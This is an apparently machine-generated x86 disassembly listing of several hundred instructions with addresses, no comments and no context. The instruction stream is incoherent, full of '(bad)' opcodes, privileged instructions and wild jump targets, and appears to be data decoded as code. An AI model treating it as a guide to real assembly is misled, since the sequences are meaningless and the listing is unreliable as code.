  432244:	add    DWORD PTR [ebx],eax
  432246:	add    bh,bh
  432248:	adc    DWORD PTR [eax],ecx
  43224a:	adc    DWORD PTR [ebp+0x55],edi
  43224d:	push   es
  43224e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432254:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43225b:	inc    ebp
  43225c:	mov    esp,edi
  43225e:	or     al,0xda
  432260:	push   eax
  432261:	(bad)  
  432262:	jne    0x432218
  432264:	call   0x3b1b53
  432269:	inc    ebp
  43226a:	sar    BYTE PTR [eax],0x84
  43226d:	in     al,dx
  43226e:	add    bh,al
  432270:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432277:	(bad)  
  432278:	and    al,al
  43227a:	fs in  eax,dx
  43227c:	inc    DWORD PTR [ebp-0x7b]
  43227f:	jle    0x432290
  432281:	leave  
  432282:	scas   al,BYTE PTR es:[edi]
  432283:	inc    esp
  432284:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43228b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432292:	call   DWORD PTR [edi]
  432294:	shr    ah,0x84
  432297:	xchg   DWORD PTR [eax],eax
  432299:	add    DWORD PTR [eax],eax
  43229b:	add    bh,bh
  43229d:	dec    ebp
  43229e:	and    BYTE PTR [ecx-0x38],dl
  4322a1:	push   eax
  4322a2:	dec    DWORD PTR [ebx+0xfd885]
  4322a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4322ae:	mov    WORD PTR [ecx+0x0],ss
  4322b1:	lea    ecx,[ebx+0x108b20d8]
  4322b7:	mov    WORD PTR [edx],ds
  4322b9:	add    BYTE PTR [edi+0xff01ff],al
  4322bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4322c2:	push   ecx
  4322c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4322c7:	inc    ebp
  4322c8:	in     al,0xeb
  4322ca:	jno    0x432257
  4322cc:	push   edx
  4322cd:	mov    DWORD PTR [eax-0x28],edx
  4322d0:	mov    eax,DWORD PTR [ebp+0x20]
  4322d3:	je     0x43225c
  4322d5:	mov    eax,DWORD PTR [ecx]
  4322d7:	sbb    BYTE PTR [eax],al
  4322d9:	pop    DWORD PTR [eax]
  4322db:	add    esi,eax
  4322dd:	add    bl,al
  4322df:	adc    DWORD PTR [edi],esi
  4322e1:	jmp    0x8bce7333
  4322e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4322ed:	jne    0x43227a
  4322ef:	mov    ecx,DWORD PTR [eax]
  4322f1:	in     al,0x75
  4322f3:	pop    DWORD PTR [ecx+0x5401]
  4322f9:	push   edx
  4322fa:	inc    DWORD PTR [ebx]
  4322fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432302:	add    BYTE PTR [edi+0x9],dl
  432305:	call   DWORD PTR [esi]
  432307:	and    dl,al
  432309:	and    bh,bh
  43230b:	inc    edi
  43230d:	test   eax,edx
  43230f:	sldt   ebx
  432312:	xor    al,BYTE PTR [eax]
  432314:	pushf  
  432315:	(bad)  
  432316:	jmp    0x432324
  432318:	mov    eax,edi
  43231a:	or     al,0x75
  43231c:	inc    eax
  43231d:	call   0x431a25
  432322:	mov    eax,eax
  432324:	loopne 0x4322aa
  432326:	inc    ebp
  432327:	add    BYTE PTR [ebx+0x1451c00],cl
  43232d:	mov    eax,DWORD PTR [ebp+0x20]
  432330:	add    edi,ecx
  432332:	add    BYTE PTR [eax],ch
  432334:	cmp    edi,0x18
  432337:	test   DWORD PTR [ebp+0xf],esi
  43233a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432341:	jne    0x432345
  432343:	call   0xffa21e08
  432348:	leave  
  432349:	rcr    BYTE PTR [esp+eax*4],0x55
  43234d:	add    ah,ch
  43234f:	add    BYTE PTR [edi-0x48fef979],dh
  432355:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43235c:	inc    esp
  43235d:	mov    ebx,DWORD PTR [eax]
  43235f:	fcom   st(2)
  432361:	add    BYTE PTR [edi],bl
  432363:	lea    ecx,[eax-0x18]
  432366:	(bad)  
  432367:	push   DWORD PTR [ecx]
  432369:	call   0xffb570cb
  43236e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432372:	fstp   DWORD PTR [esi+ebx*8]
  432375:	push   ebp
  432376:	pop    ebp
  432377:	mov    esi,DWORD PTR [edx-0x38]
  43237a:	add    DWORD PTR [eax],0x28
  43237d:	mov    edi,DWORD PTR [ebx]
  43237f:	xor    esi,DWORD PTR [edx+0x3]
  432382:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432386:	pop    ebp
  432387:	or     al,0x4
  432389:	inc    ecx
  43238a:	push   ebp
  43238b:	(bad)  
  43238c:	in     al,dx
  43238d:	or     ah,ch
  43238f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432390:	xbegin 0xffc89986
  432396:	clc    
  432397:	adc    al,0x45
  432399:	div    BYTE PTR [edx]
  43239b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4323a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4323a8:	add    BYTE PTR [ecx+0x66],dh
  4323ab:	add    eax,DWORD PTR [ebp+0x52]
  4323ae:	adc    eax,0xffffffa0
  4323b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4323b7:	test   DWORD PTR [eax],eax
  4323b9:	clc    
  4323ba:	data16 or al,BYTE PTR [ebp+0x45]
  4323be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4323c5:	rol    BYTE PTR [ebp+0x45],1
  4323c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4323ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4323d4:	push   ebx
  4323d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4323d9:	jge    0x43240e
  4323db:	add    BYTE PTR [esi+0x4],dl
  4323de:	jne    0x432445
  4323e0:	mov    edx,0x457200
  4323e5:	jmp    0x4323a9
  4323e7:	xor    edi,DWORD PTR [ebx]
  4323e9:	pop    edi
  4323ea:	cvtdq2ps xmm7,xmm0
  4323ed:	ret    0x0
  4323f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323f6:	xor    ecx,DWORD PTR [edi]
  4323f8:	add    eax,DWORD PTR [ecx+0x3b]
  4323fb:	push   ebx
  4323fc:	rdpmc  
  4323fe:	out    0x8d,al
  432400:	add    BYTE PTR [eax],cl
  432402:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432408:	ret    0x450c
  43240b:	sbb    al,0x8b
  43240d:	cmp    eax,esi
  43240f:	or     cl,al
  432411:	or     al,0xc2
  432413:	pop    eax
  432414:	inc    ebp
  432415:	add    ecx,DWORD PTR [edi]
  432417:	add    esi,DWORD PTR [ebp+0x39]
  43241a:	invd   
  43241c:	jge    0x432428
  43241e:	mov    eax,0x478ac0
  432423:	cli    
  432424:	xor    esp,ecx
  432426:	mov    ebx,0x5b8ac0
  43242b:	ret    0x33
  43242e:	mov    eax,0x833b8b
  432433:	sub    BYTE PTR [ebx],al
  432435:	inc    ebp
  432436:	xor    ax,di
  432439:	pushf  
  43243a:	inc    bh
  43243c:	mov    esp,esp
  43243e:	hlt    
  43243f:	test   DWORD PTR [ebp-0x8],esi
  432442:	mov    eax,DWORD PTR [ebp-0x14]
  432445:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43244b:	dec    edi
  43244c:	or     BYTE PTR [eax],al
  43244e:	jne    0x4323d9
  432450:	mov    esi,esp
  432452:	call   0x77a9b017
  432457:	inc    ebp
  432458:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43245e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432464:	add    BYTE PTR [esi+0x7d],ah
  432467:	inc    ebp
  432468:	mov    bx,WORD PTR [ebp+0x8]
  43246c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432473:	inc    ebp
  432474:	mov    bx,di
  432477:	lock test BYTE PTR [ecx+0x7000801],bh
  43247e:	jge    0x432441
  432480:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432486:	cli    
  432487:	xor    bl,bh
  432489:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43248f:	test   BYTE PTR [eax],cl
  432491:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432498:	cmp    ebp,eax
  43249a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4324a1:	test   BYTE PTR [ebp+0x1],bh
  4324a4:	mov    ebx,0x458a00
  4324a9:	xor    esi,DWORD PTR [ebx]
  4324ab:	add    esp,DWORD PTR [esi-0x77]
  4324ae:	pop    ebp
  4324af:	loopne 0x432517
  4324b1:	inc    ebp
  4324b2:	clc    
  4324b3:	xor    edi,DWORD PTR [ebx]
  4324b5:	add    esi,DWORD PTR [edx-0x77]
  4324b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4324bc:	mov    ebx,0xb78afc
  4324c1:	hlt    
  4324c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4324c5:	add    BYTE PTR [ebp+0x66],bl
  4324c8:	data16 lock clc 
  4324cb:	cmp    al,0x3b
  4324cd:	add    BYTE PTR [edi+0x66],dh
  4324d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4324d4:	ltr    WORD PTR [ebp+0x66]
  4324d8:	add    esi,eax
  4324da:	add    di,WORD PTR [ebp+0x2b]
  4324de:	data16 data16 jge 0x43255f
  4324e2:	mov    ebx,0xe08a8b
  4324e7:	jge    0x43251c
  4324e9:	data16 data16 xor al,0x5d
  4324ed:	data16 data16 jne 0x4324e9
  4324f1:	mov    edi,DWORD PTR [ebx]
  4324f3:	fdiv   QWORD PTR [edx+0x7d]
  4324f6:	data16 data16 jge 0x43252e
  4324fa:	mov    ebx,0x758a66
  4324ff:	mov    esi,0x667233
  432504:	pop    ebp
  432505:	or     BYTE PTR [esi+0x0],ah
  432508:	clc    
  432509:	mov    edi,DWORD PTR [ebx]
  43250b:	lock ja 0x432499
  43250e:	(bad)  
  432510:	jge    0x432509
  432512:	invd   
  432514:	pop    ebp
  432515:	add    BYTE PTR [ebx],al
  432517:	(bad)  
  432518:	cmp    di,WORD PTR [ebp+0xf]
  43251c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432520:	mov    bx,WORD PTR [ebp-0x10]
  432524:	pop    bp
  432526:	fbstp  TBYTE PTR [ebx]
  432528:	test   DWORD PTR [ebx],eax
  43252a:	add    BYTE PTR [ebx],bh
  43252c:	add    BYTE PTR [esi+0x7d],ah
  43252f:	jge    0x4324bc
  432531:	data16 in al,dx
  432533:	pop    ebp
  432534:	stc    
  432535:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43253c:	mov    edi,ebx
  43253e:	in     al,dx
  43253f:	test   BYTE PTR [ebp+0x0],bh
  432542:	mov    eax,DWORD PTR [eax]
  432544:	call   0xbd401ed4
  432549:	cmp    al,0x9b
  43254b:	add    BYTE PTR [edx],dh
  43254d:	mov    bx,di
  432550:	call   0x8b4ba2e0
  432555:	add    ebp,esp
  432557:	mov    bx,di
  43255a:	jnp    0x432582
  43255c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432562:	mov    eax,DWORD PTR [eax]
  432564:	call   0x7c3eb0cf
  432569:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43256f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432574:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43257e:	fisttp WORD PTR [ecx-0x7401f77b]
  432584:	(bad)  
  432585:	cld    
  432586:	jne    0x4325c4
  432588:	xor    eax,DWORD PTR [eax]
  43258a:	mov    esp,DWORD PTR [esi-0x10]
  43258d:	sti    
  43258e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432595:	data16 adc bl,bh
  432598:	push   ebp
  432599:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4325a0:	mov    WORD PTR [eax],es
  4325a2:	fwait
  4325a3:	data16 xor bh,bl
  4325a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4325ac:	mov    esp,DWORD PTR [esi-0x14]
  4325af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4325b5:	or     al,0x2b
  4325b7:	mov    bh,0xba
  4325b9:	hlt    
  4325ba:	mov    bh,bl
  4325bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4325c2:	dec    esi
  4325c3:	or     al,0x0
  4325c5:	mov    edi,DWORD PTR [ebx]
  4325c7:	or     BYTE PTR [ebp+0x3b],dh
  4325ca:	mov    ecx,DWORD PTR [edi]
  4325cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4325d2:	xor    al,0xd8
  4325d4:	pop    bp
  4325d6:	lock xor esi,DWORD PTR [ebx]
  4325d9:	lea    esp,[esi+0x1f]
  4325dc:	icebp  
  4325dd:	jb     0x4325e3
  4325df:	add    al,al
  4325e1:	jge    0x4325ef
  4325e3:	mov    eax,eax
  4325e5:	fsubr  st,st(3)
  4325e7:	pop    ebp
  4325e8:	mov    esi,DWORD PTR [ebx]
  4325ea:	in     al,0x8d
  4325ec:	rcr    DWORD PTR [edi],0xc2
  4325ef:	jb     0x43264f
  4325f1:	add    cl,cl
  4325f3:	jge    0x432601
  4325f5:	mov    edx,DWORD PTR [ebp-0x20]
  4325f8:	in     al,dx
  4325f9:	pop    ebp
  4325fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325ff:	cmp    di,WORD PTR [ebp+0x0]
  432603:	mov    ebp,DWORD PTR [ebx]
  432605:	fdivr  QWORD PTR [esi+0x668a5d]
  43260b:	cmp    al,0x33
  43260d:	mov    si,0x4e7d
  432611:	mov    eax,DWORD PTR [eax]
  432613:	lock inc ebp
  432615:	mov    esi,DWORD PTR [eax]
  432617:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43261e:	clc    
  43261f:	(bad)  
  432620:	cmp    edi,DWORD PTR [ebx]
  432622:	je     0x432633
  432624:	push   ebx
  432625:	loopne 0x432636
  432627:	dec    ecx
  432629:	mov    esp,DWORD PTR [ebp-0x1c]
  43262c:	int    0xf1
  43262e:	mov    esi,0x703084d
  432633:	pcmpgtd mm6,mm1
  432636:	add    BYTE PTR [ebp+0x66],dh
  432639:	jmp    0x432606
  43263b:	mov    eax,DWORD PTR [ebx]
  43263d:	lock push ebp
  43263f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432645:	or     bh,dl
  432647:	jb     0x432647
  432649:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43264f:	loopne 0x432651
  432651:	jne    0x432655
  432653:	data16 add BYTE PTR [esi+eiz*2],dh
  432657:	mov    ecx,ebx
  432659:	data16 cmp al,0xf1
  43265c:	add    BYTE PTR [esi+eiz*2],bh
  43265f:	add    bl,cl
  432661:	retw   0xf2
  432665:	ret    0x66
  432668:	retf   
  432669:	enterw 0x4df1,0x19
  43266e:	pop    edi
  43266f:	jne    0x4325f2
  432671:	mov    esi,DWORD PTR [eax]
  432673:	call   0x77b7b214
  432678:	xor    ebp,DWORD PTR [ebx]
  43267a:	lea    esp,[esi+0x48]
  43267d:	repnz in eax,0x3b
  432680:	add    BYTE PTR [ebp-0x37],dh
  432683:	xor    edx,DWORD PTR [ebp-0x15]
  432686:	in     al,dx
  432687:	xor    edx,DWORD PTR [esi+0x40]
  43268a:	mov    DWORD PTR [edi],0x338545fc
  432690:	clc    
  432691:	add    esi,DWORD PTR [ecx]
  432693:	pop    edi
  432694:	pushf  
  432695:	pop    ebx
  432696:	call   0xff44265d
  43269b:	mov    edi,eax
  43269d:	push   ecx
  43269e:	pop    es
  43269f:	mov    edi,DWORD PTR [eax]
  4326a1:	push   esi
  4326a2:	inc    esi
  4326a3:	add    bh,BYTE PTR [esi+0x0]
  4326a6:	popa   
  4326a7:	data16 (bad) 
  4326a9:	into   
  4326aa:	gs cmp al,0xcd
  4326ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4326b3:	ret    0x66
  4326b6:	add    bh,al
  4326b8:	add    bh,ah
  4326ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4326c0:	cmp    al,0x9c
  4326c2:	add    BYTE PTR [esi+0x66],ah
  4326c5:	into   
  4326c6:	ret    
  4326c7:	pop    ebp
  4326c8:	adc    BYTE PTR [edi+0x0],dl
  4326cb:	mov    bh,0x66
  4326cd:	mov    edi,0xff038dc3
  4326d2:	jne    0x432728
  4326d4:	lea    edx,[ecx+0x1]
  4326d7:	mov    ebx,0xd64ff1
  4326dc:	sar    DWORD PTR [ebx],1
  4326de:	test   BYTE PTR [ebp+0x36],dh
  4326e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326e5:	push   edi
  4326e6:	xor    BYTE PTR [ebx],0x38
  4326e9:	mov    esi,ebx
  4326eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4326f1:	ss inc ebp
  4326f3:	fs pop ebx
  4326f5:	mov    ebx,0x9c3b30
  4326fa:	je     0x432727
  4326fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432702:	mov    WORD PTR [ebx],?
  432704:	ss mov ebx,0x8b4e64
  43270a:	pop    edi
  43270b:	cmp    ecx,ecx
  43270d:	jne    0x432764
  43270f:	mov    ebp,esp
  432711:	cld    
  432712:	push   esi
  432713:	pop    ebx
  432714:	inc    ebp
  432715:	stc    
  432716:	xor    BYTE PTR [ebp+0x9bef89c],al
  43271c:	test   esi,ecx
  43271e:	clc    
  43271f:	test   dl,dl
  432721:	cmp    bh,bh
  432723:	fs pop si
  432726:	or     bl,al
  432728:	add    cl,BYTE PTR [ebx+0x57665100]
  43272e:	retf   0x3c45
  432731:	xor    BYTE PTR [eax],al
  432733:	pushf  
  432734:	mov    si,0x85ca
  432738:	ret    0xf8
  43273b:	pop    ebx
  43273c:	dec    dx
  43273f:	mov    edx,DWORD PTR [edi-0x76]
  432742:	push   edi
  432743:	add    al,0xb7
  432745:	xor    al,0xba
  432747:	cmp    al,0x8d
  432749:	je     0x43274a
  43274b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43274f:	lea    edi,[ebx+0x544fff]
  432755:	push   ecx
  432756:	cmp    edx,DWORD PTR [ebx+0x75]
  432759:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43275f:	add    BYTE PTR [ebx],dh
  432761:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432767:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43276e:	mov    ebx,0x3b3b00
  432773:	jne    0x4327a0
  432775:	mov    DWORD PTR [ebx+0x728afc],edi
  43277b:	xor    esi,DWORD PTR [ebx]
  43277d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432783:	push   edi
  432784:	cmp    esp,ebp
  432786:	jne    0x432788
  432788:	sbb    DWORD PTR [eax],0x8085c3fc
  43278e:	clc    
  43278f:	inc    esi
  432790:	pop    ebx
  432791:	sti    
  432792:	add    eax,0xeb8bc075
  432797:	cld    
  432798:	xor    edi,DWORD PTR ds:0xf8c3855e
  43279e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4327a1:	rol    DWORD PTR [ebp-0x37],0xf
  4327a5:	mov    DWORD PTR [eax],ecx
  4327a7:	inc    edi
  4327a8:	(bad)  
  4327a9:	in     eax,0xfe
  4327ab:	add    bh,bh
  4327ad:	(bad)  
  4327ae:	mov    esi,0xc38a5e
  4327b3:	mov    esi,DWORD PTR [ebx]
  4327b5:	push   ecx
  4327b6:	mov    edi,0xfc4ec7
  4327bb:	test   DWORD PTR [ebp-0x8],edx
  4327be:	xor    di,ax
  4327c1:	pushf  
  4327c2:	sub    ebp,eax
  4327c4:	inc    ebp
  4327c5:	(bad)  
  4327c6:	sub    edi,edi
  4327c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4327ce:	inc    ebp
  4327cf:	add    BYTE PTR [esi+0x2b],ah
  4327d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4327d8:	cmp    al,0x33
  4327da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4327e0:	(bad)  
  4327e1:	cmp    esi,DWORD PTR [ebx]
  4327e3:	je     0x43279d
  4327e5:	push   ebx
  4327e6:	dec    esi
  4327e7:	str    ecx
  4327ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4327ed:	int    0x33
  4327ef:	mov    edi,0x789085f
  4327f4:	mov    edx,DWORD PTR [eax]
  4327f6:	cld    
  4327f7:	add    cl,cl
  4327f9:	data16 add al,0xcb
  4327fc:	push   ebp
  4327fd:	add    ebp,esp
  4327ff:	jne    0x4327ed
  432801:	(bad)  
  432802:	mov    DWORD PTR [ecx],0xd685f7ec
  432808:	clc    
  432809:	xlat   BYTE PTR ds:[ebx]
  43280a:	inc    ebp
  43280b:	mov    esi,DWORD PTR [edx]
  43280d:	push   eax
  43280e:	pushf  
  43280f:	in     eax,0x8b
  432811:	add    ah,ch
  432813:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432817:	add    ax,0x72cb
  43281b:	cmp    al,0x0
  43281d:	add    BYTE PTR [ebp+0x66],al
  432820:	(bad)  
  432821:	retf   
  432822:	lock ret 0x85
  432826:	clc    
  432827:	inc    bp
  432829:	retf   
  43282a:	cmp    eax,0xc77d9cc8
  43282f:	xor    ah,bh
  432831:	pushf  
  432832:	test   DWORD PTR [edi-0x8],ebx
  432835:	je     0x43287c
  432837:	xor    esi,DWORD PTR ds:0x7020840
  43283d:	ror    BYTE PTR [ebp-0x37],0x8d
  432841:	push   ebp
  432842:	add    esp,ebp
  432844:	jb     0x4327d1
  432846:	add    BYTE PTR [eax],cl
  432848:	dec    ebp
  432849:	mov    bh,0x81
  43284b:	push   esi
  43284c:	push   esp
  43284d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432854:	xor    al,BYTE PTR [eax]
  432856:	mov    edx,DWORD PTR [edi+0x10]
  432859:	(bad)  
  43285a:	scas   eax,DWORD PTR es:[edi]
  43285b:	ret    0x3b
  43285e:	jns    0x3b442551
  432864:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432868:	dec    ebp
  432869:	or     BYTE PTR [ebx],ch
  43286b:	ret    0x458b
  43286e:	lock jmp 0x432862
  432871:	mov    ecx,DWORD PTR [eax]
  432873:	or     BYTE PTR [edi],al
  432875:	mov    ecx,eax
  432877:	xor    DWORD PTR [edx+0x2],0x0
  43287b:	mov    bh,0xc1
  43287d:	adc    BYTE PTR [eax],dh
  43287f:	iret   
  432880:	inc    ebp
  432881:	mov    DWORD PTR [ebx],0x4dfff8c4
  432887:	inc    BYTE PTR [ebx]
  432889:	ret    0xf8
  43288c:	adc    DWORD PTR [esi+0x10],esp
  43288f:	clc    
  432890:	dec    ecx
  432891:	fisttp WORD PTR [ecx+0x456604c0]
  432897:	add    dh,BYTE PTR ds:0x75e0845
  43289d:	ret    0x4d
  4328a0:	lea    ecx,[ebx+0x18728301]
  4328a6:	add    BYTE PTR [ebp+0x45],al
  4328a9:	xor    ecx,ebp
  4328ab:	pushf  
  4328ac:	add    bh,al
  4328ae:	add    al,ch
  4328b0:	inc    ebp
  4328b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4328b7:	xor    eax,0x781084d
  4328bc:	push   esp
  4328bd:	fwait
  4328be:	push   ecx
  4328bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4328c5:	inc    ebp
  4328c6:	cmp    edi,DWORD PTR [ecx]
  4328c8:	jbe    0x432866
  4328ca:	mov    eax,edi
  4328cc:	or     ah,dh
  4328ce:	inc    ebp
  4328cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4328d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4328db:	in     al,dx
  4328dc:	hlt    
  4328dd:	push   esp
  4328de:	push   esp
  4328df:	push   ecx
  4328e0:	push   ecx
  4328e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328e7:	fwait
  4328e8:	fwait
  4328e9:	xor    dh,BYTE PTR [edx]
  4328eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4328f1:	or     BYTE PTR [ebp+0x7],al
  4328f4:	mov    eax,ecx
  4328f6:	clc    
  4328f7:	jb     0x4328ba
  4328f9:	add    BYTE PTR [ebp+0x55],cl
  4328fc:	or     DWORD PTR [edi],0xc251d154
  432902:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43290c:	mov    edi,eax
  43290e:	or     cl,al
  432910:	inc    ebp
  432911:	dec    ebp
  432912:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432918:	or     WORD PTR [ecx],0x899b
  43291d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432923:	mov    edx,DWORD PTR [ecx+0x8]
  432926:	mov    eax,DWORD PTR [ebp-0x8]
  432929:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432930:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432936:	inc    ebp
  432937:	dec    eax
  432938:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  43293e:	add    edx,DWORD PTR [ecx-0x8]
  432941:	mov    ecx,DWORD PTR [ecx]
  432943:	clc    
  432944:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  43294b:	mov    ecx,ebp
  43294d:	clc    
  43294e:	(bad)  
  43294f:	popf   
  432950:	inc    DWORD PTR [eax]
  432952:	ret    0x8b
  432955:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43295b:	mov    edi,esp
  43295d:	hlt    
  43295e:	test   ecx,esi
  432960:	clc    
  432961:	or     BYTE PTR [ebp+0x7],al
  432964:	xor    al,cl
  432966:	pushf  
  432967:	jb     0x43299c
  432969:	add    BYTE PTR [eax-0x3f],al
  43296c:	inc    eax
  43296d:	daa    
  43296e:	inc    ebp
  43296f:	inc    ebp
  432970:	xor    eax,0x7f80803
  432975:	dec    ebp
  432976:	fwait
  432977:	add    esi,DWORD PTR [edx]
  432979:	clc    
  43297a:	cmp    DWORD PTR [ecx],ecx
  43297c:	or     al,0x8
  43297e:	add    al,BYTE PTR [ebp+0x2c]
  432981:	xor    eax,0x7350845
  432986:	or     BYTE PTR [ebp+0x7],cl
  432989:	lea    ebx,[ebx-0x748dcdff]
  43298f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432996:	mov    edx,DWORD PTR [eax]
  432998:	cld    
  432999:	dec    ebp
  43299a:	push   esp
  43299b:	sub    edx,DWORD PTR [ecx-0x75]
  43299e:	add    eax,0xf172fc
  4329a3:	or     BYTE PTR [ebp+0x7],cl
  4329a6:	add    eax,ecx
  4329a8:	or     al,0x72
  4329aa:	add    DWORD PTR [eax],eax
  4329ac:	mov    ebx,0x29c2c1
  4329b1:	inc    ebp
  4329b2:	mov    eax,DWORD PTR [ebx]
  4329b4:	cmp    eax,0x3004d1c
  4329ba:	xbegin 0x66c8b5b4
  4329c0:	clc    
  4329c1:	or     BYTE PTR [ebp+0x45],al
  4329c4:	xor    dh,BYTE PTR ds:0x78b089c
  4329ca:	adc    BYTE PTR [ebp+0x45],cl
  4329cd:	lea    eax,[ebp+0x33727501]
  4329d3:	add    cl,ch
  4329d5:	inc    ebp
  4329d6:	add    bl,ch
  4329d8:	add    BYTE PTR [ebx+0x45850845],cl
  4329de:	je     0x43296b
  4329e0:	push   ebx
  4329e1:	or     al,0x85
  4329e3:	dec    ebp
  4329e4:	std    
  4329e5:	mov    bh,bh
  4329e7:	mov    BYTE PTR [ebp-0x75],al
  4329ea:	mov    edi,eax
  4329ec:	or     al,0x89
  4329ee:	inc    ebp
  4329ef:	clc    
  4329f0:	mov    esp,esp
  4329f2:	hlt    
  4329f3:	call   DWORD PTR [edi-0x37]
  4329f6:	push   esp
  4329f7:	or     al,0x51
  4329f9:	push   ebp
  4329fa:	xor    ebp,esp
  4329fc:	mov    esi,0x457251
  432a01:	xor    esi,eax
  432a03:	pushf  
  432a04:	inc    ebp
  432a05:	(bad)  
  432a06:	mov    edi,eax
  432a08:	or     al,0x85
  432a0a:	add    al,bh
  432a0c:	inc    eax
  432a0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a12:	or     ah,bh
  432a14:	inc    eax
  432a15:	push   esp
  432a16:	jmp    0x432a69
  432a18:	mov    eax,DWORD PTR ds:0xe8720c
  432a1e:	mov    DWORD PTR [ebp-0x8],eax
  432a21:	jne    0x432a68
  432a23:	jmp    0x4329b0
  432a25:	mov    ebp,DWORD PTR [eax]
  432a27:	clc    
  432a28:	retf   0xff54
  432a2b:	push   ecx
  432a2c:	mov    DWORD PTR ds:0x757210,eax
  432a32:	mov    ecx,DWORD PTR [ebp-0x4]
  432a35:	sub    esp,DWORD PTR [ebx-0x77]
  432a38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a3f:	or     ah,bh
  432a41:	pop    es
  432a42:	ds fwait
  432a44:	push   DWORD PTR [edx]
  432a46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432a4c:	(bad)  
  432a4d:	mov    bh,bh
  432a4f:	jmp    0x432a3d
  432a51:	leave  
  432a52:	jne    0x432a5c
  432a54:	call   0x3023ae
  432a59:	in     al,dx
  432a5a:	dec    ebp
  432a5b:	add    dh,BYTE PTR [ebx]
  432a5d:	add    BYTE PTR [ebx],al
  432a5f:	inc    ebp
  432a60:	cmp    esi,DWORD PTR [ecx]
  432a62:	je     0x432a00
  432a64:	mov    eax,edi
  432a66:	or     al,0xf0
  432a68:	add    BYTE PTR [ebp+0x458bf845],al
  432a6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a74:	adc    al,0x7
  432a76:	enter  0x9fc0,0xa5
  432a7a:	rol    BYTE PTR [eax],0x5e
  432a7d:	mov    ecx,ecx
